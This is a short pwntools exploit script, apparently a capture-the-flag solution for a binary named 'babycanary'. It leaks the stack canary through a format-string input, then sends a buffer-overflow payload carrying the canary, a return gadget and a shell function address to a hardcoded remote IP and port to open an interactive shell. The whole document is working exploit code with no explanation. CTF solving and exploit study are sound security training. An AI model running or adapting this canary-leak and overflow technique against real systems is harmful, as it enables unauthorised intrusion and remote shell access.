from pwn import *

p = process("./babycanary")
p = remote("3.101.12.127",5004)
elf = context.binary = ELF("./babycanary")
p.recvline()
p.recvline()
p.sendline(b'%25$p')
p.recvline()
k = p.recvline()[:-1]
print(k)
canary = int(k,16)
ret = 0x000000000040101a
sh = 0x0000000004011f6
payload = flat(b'a'*152 ,canary , b'a'*8,ret,sh)
p.recvline()
p.sendline(payload)
p.interactive()

